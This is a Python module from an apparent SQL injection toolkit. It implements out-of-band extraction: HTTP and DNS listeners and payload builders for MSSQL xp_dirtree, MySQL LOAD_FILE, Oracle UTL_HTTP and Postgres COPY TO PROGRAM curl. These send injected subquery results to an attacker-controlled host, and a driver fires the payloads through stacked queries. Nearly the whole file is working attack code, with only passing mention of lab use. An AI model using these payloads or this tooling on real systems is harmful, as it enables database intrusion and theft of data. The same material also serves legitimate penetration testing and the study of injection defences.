r"""
Out-of-band (OOB) extraction support.

Combines two listeners:
  - DNSListener (from core.dns_listener) — catches DNS queries triggered
    by MySQL LOAD_FILE and MSSQL xp_dirtree payloads.
  - OOBListener — an HTTP listener that catches UTL_HTTP.REQUEST (Oracle)
    and COPY TO PROGRAM 'curl ...' (Postgres) style payloads.

Payload embedding:
  The toolkit binds its listeners on 127.0.0.1, but a payload sent to a
  *remote* target has to reference an address the target can reach. The
  caller supplies that address via `public_addr` (typically a public IP
  or an attacker-controlled domain). When the target is local (the lab),
  public_addr is 127.0.0.1 and the embedded addresses match the listeners.

  `public_addr` is what goes into the payload string. The listener stays
  bound to 127.0.0.1 and relies on the fact that a lab target is also
  local — that's fine for testing but wouldn't work against a real remote
  host without an equivalent routing setup.

Limitations:
  - HTTP exfil only for Oracle/Postgres. MySQL/MSSQL use SMB (\\host\share),
    which resolves via DNS *before* attempting SMB. The DNS listener
    catches the resolution; the SMB connection that follows has nowhere
    to land, which doesn't matter because we already have the data.
  - No EDNS0/compression support in the DNS parser (queries don't use
    either; harmless).
  - Time-based escalation not implemented. OOB is fire-and-catch; the
    extraction strategies are "send a probe and wait for a hit" and
    "send an exfil fragment and read the subdomain".
"""

import asyncio
import secrets

from aiohttp import web

from core.dns_listener import DNSListener, DEFAULT_DNS_PORT
from core.output import info, success, warn


# ---------------------------------------------------------------------
# HTTP listener
# ---------------------------------------------------------------------

DEFAULT_HTTP_PORT = 9876


class OOBListener:
    """HTTP listener that records incoming GETs.

    Intended to catch Oracle UTL_HTTP and Postgres COPY TO PROGRAM
    payloads. Not usable for MySQL/MSSQL, which use SMB — see the DNS
    listener for those.
    """

    def __init__(self, port=DEFAULT_HTTP_PORT, bind_addr="127.0.0.1",
                 token=None, verbose=False):
        self.port = port
        self.bind_addr = bind_addr
        self.token = token or secrets.token_hex(4)
        self.verbose = verbose
        self.hits = []          # list of dicts
        self._runner = None

    async def _handler(self, request):
        remote = request.remote or "?"
        hit = {
            "path": request.path,
            "query_string": request.query_string,
            "remote": remote,
        }
        self.hits.append(hit)
        if self.verbose:
            info(f"HTTP OOB hit: {request.path}?{request.query_string} "
                 f"from {remote}")
        return web.Response(status=204)

    async def start(self):
        app = web.Application()
        app.router.add_route("*", "/{tail:.*}", self._handler)
        self._runner = web.AppRunner(app)
        await self._runner.setup()
        site = web.TCPSite(self._runner, self.bind_addr, self.port)
        try:
            await site.start()
        except OSError as e:
            raise RuntimeError(
                f"OOB HTTP listener could not bind to "
                f"{self.bind_addr}:{self.port} "
                f"({type(e).__name__}: {e}). Pick another port with "
                f"--oob-http-port."
            )
        info(f"OOB HTTP listener on http://{self.bind_addr}:{self.port} "
             f"(token={self.token})")
        return self.port

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()
            self._runner = None

    async def wait_for_hit(self, substring, timeout=5.0):
        loop = asyncio.get_running_loop()
        deadline = loop.time() + timeout
        while loop.time() < deadline:
            for hit in self.hits:
                if substring in hit["query_string"] or \
                   substring in hit["path"]:
                    return hit
            await asyncio.sleep(0.1)
        return None

    def has_hit(self, substring):
        return any(substring in h["query_string"] or substring in h["path"]
                   for h in self.hits)


# ---------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------
#
# Each generator returns a SQL fragment intended to be spliced into the
# injected query. The toolkit decides where to splice based on the
# context (stacked query, UNION column, or expression).
#
# `host` and `port` are the address that will appear in the payload —
# i.e. what the target will try to resolve or connect to. `marker` is a
# random string that appears in the outbound request so the listener can
# match this specific scan.

def probe_mssql(host, port, marker):
    """MSSQL: xp_dirtree triggers an SMB connection to \\\\host\\share.
    DNS resolution of `host` happens first, so the DNS listener sees a
    query for `host` even though the SMB connect itself goes elsewhere.
    """
    return f"EXEC master..xp_dirtree '\\\\{host}\\{marker}'"


def probe_mysql(host, port, marker):
    """MySQL: LOAD_FILE on a UNC path triggers SMB + DNS lookup."""
    return f"LOAD_FILE('\\\\\\\\{host}\\\\{marker}')"


def probe_oracle(host, port, marker):
    """Oracle: UTL_HTTP.REQUEST makes an HTTP GET to host:port."""
    return f"UTL_HTTP.REQUEST('http://{host}:{port}/?{marker}')"


def probe_postgres(host, port, marker):
    """Postgres: COPY TO PROGRAM runs curl. Requires superuser."""
    return (f"COPY (SELECT '') TO PROGRAM "
            f"'curl http://{host}:{port}/?{marker}'")


OOB_PROBES = {
    "mssql":    probe_mssql,
    "mysql":    probe_mysql,
    "oracle":   probe_oracle,
    "postgres": probe_postgres,
}


# --- Exfiltration fragments -------------------------------------------
#
# These build a payload that embeds the *result* of a subquery into the
# outbound request. Each call to the DBMS produces one outbound lookup
# whose hostname (or URL) contains the extracted data.
#
# The embedded hostname must be a valid DNS label, which means:
#   - <= 63 characters per label
#   - alphanumeric plus hyphen
# Anything else needs encoding. We do a simple hex-encoding for
# non-alphanumeric characters to keep the payload valid.

def _sanitize_for_dns(s):
    """Encode arbitrary bytes as a DNS-safe label.

    Alphanumerics pass through unchanged; everything else is encoded
    as `-XX` where XX is the hex value. Hyphens in the input become
    `-2D` to avoid ambiguity with the escape marker.
    """
    out = []
    for ch in s:
        if ch.isalnum() and ord(ch) < 128:
            out.append(ch)
        elif ch == "-":
            out.append("-2D")
        else:
            out.append(f"-{ord(ch):02X}")
    return "".join(out)


def exfil_mssql(host, port, subquery):
    # xp_dirtree takes a UNC path. DNS resolution of the hostname part
    # happens before SMB connect, so the DNS listener catches the query.
    return (f"EXEC master..xp_dirtree "
            f"'\\\\' + {subquery} + '.{host}\\x'")


def exfil_mysql(host, port, subquery):
    return (f"LOAD_FILE(CONCAT('\\\\\\\\', {subquery}, '.{host}\\\\x'))")


def exfil_oracle(host, port, subquery):
    return (f"UTL_HTTP.REQUEST('http://' || {subquery} || "
            f"'.{host}:{port}/')")


def exfil_postgres(host, port, subquery):
    return (f"COPY (SELECT '') TO PROGRAM "
            f"'curl http://' || {subquery} || '.{host}:{port}/'")


OOB_EXFIL = {
    "mssql":    exfil_mssql,
    "mysql":    exfil_mysql,
    "oracle":   exfil_oracle,
    "postgres": exfil_postgres,
}


# ---------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------

def supports_oob(dbms):
    return dbms in OOB_PROBES


def build_probe(dbms, host, port, marker):
    fn = OOB_PROBES.get(dbms)
    if fn is None:
        return None
    return fn(host, port, marker)


def build_exfil(dbms, host, port, subquery):
    """Return a SQL fragment that exfiltrates the result of subquery.

    The value of subquery is expected to be a SQL expression returning a
    string. The caller is responsible for quoting/sanitizing the
    expression for the dialect.
    """
    fn = OOB_EXFIL.get(dbms)
    if fn is None:
        return None
    return fn(host, port, subquery)


def sanitize_for_dns(s):
    """Public wrapper around the DNS-label sanitizer."""
    return _sanitize_for_dns(str(s))


# ---------------------------------------------------------------------
# Drivers
# ---------------------------------------------------------------------

class OOBConfig:
    """Bundles everything an OOB extraction needs.

    dns_listener and http_listener are started by the caller (toolkit.py)
    and passed in already-running. public_host is what appears in the
    payloads; if None, it defaults to the listener's bind address, which
    is the correct choice for lab testing.
    """

    def __init__(self, dns_listener, http_listener, public_host=None,
                 dns_public_port=None, http_public_port=None):
        self.dns = dns_listener
        self.http = http_listener
        self.public_host = public_host or "127.0.0.1"
        self.dns_public_port = dns_public_port or (
            dns_listener.port if dns_listener else DEFAULT_DNS_PORT)
        self.http_public_port = http_public_port or (
            http_listener.port if http_listener else DEFAULT_HTTP_PORT)

    def marker(self):
        return "oob" + secrets.token_hex(4)

    def dns_payload_for(self, dbms, marker):
        """Payload that triggers a DNS lookup of `<marker>.<public_host>`."""
        return build_probe(dbms, self.public_host,
                           self.dns_public_port, marker)

    def http_payload_for(self, dbms, marker):
        """Payload that triggers an HTTP GET to public_host:http_port."""
        return build_probe(dbms, self.public_host,
                           self.http_public_port, marker)


async def probe_target(session, point, limiter, dbms, config,
                       jar=None, verbose=False, baseline_len=None,
                       timeout=5.0):
    """Send one OOB probe and see if a hit comes back.

    Returns a dict describing which channel caught the hit, or None.
    """
    if not supports_oob(dbms):
        if verbose:
            warn(f"OOB not supported for {dbms}")
        return None

    marker = config.marker()

    # Send the probe. We use stacked-query syntax (;) because xp_dirtree
    # and UTL_HTTP are statements, not expressions. If the context
    # doesn't allow stacked queries, this will silently do nothing —
    # detecting that is the caller's job.
    from vuln.sqli import _send  # avoid circular import at module level
    payload = f"; {config.dns_payload_for(dbms, marker)}--"
    r = await _send(session, point, limiter, jar,
                    raw_payload=payload, baseline_len=baseline_len,
                    verbose=verbose, dbms=dbms)
    if r is None and verbose:
        warn(f"OOB probe transport failed for {point.name!r}")

    # Wait briefly for a DNS hit.
    if config.dns is not None:
        hit = await config.dns.wait_for_hit(marker, timeout=timeout)
        if hit:
            success(f"OOB DNS hit: {hit['qname']} "
                    f"qtype={hit['qtype_name']}")
            return {"channel": "dns", "marker": marker, "hit": hit}

    # Fall back to HTTP probe for Oracle/Postgres.
    if dbms in ("oracle", "postgres"):
        http_marker = config.marker()
        http_payload = f"; {config.http_payload_for(dbms, http_marker)}--"
        await _send(session, point, limiter, jar,
                    raw_payload=http_payload, baseline_len=baseline_len,
                    verbose=verbose, dbms=dbms)
        if config.http is not None:
            hit = await config.http.wait_for_hit(http_marker,
                                                 timeout=timeout)
            if hit:
                success(f"OOB HTTP hit: {hit['path']}?{hit['query_string']}")
                return {"channel": "http", "marker": http_marker, "hit": hit}

    return None